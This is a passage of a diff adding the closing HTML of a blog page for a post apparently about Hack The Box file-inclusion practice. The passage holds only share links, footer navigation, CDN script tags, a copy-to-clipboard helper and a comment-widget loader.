+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&is_video=false&description=HTB渗透学习-FILEINCLUSION"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB渗透学习-FILEINCLUSION&body=Check out this article: http://example.com/2024/09/16/HTB-19-FILEINCLUSION/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&name=HTB渗透学习-FILEINCLUSION&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&t=HTB渗透学习-FILEINCLUSION"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2025
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
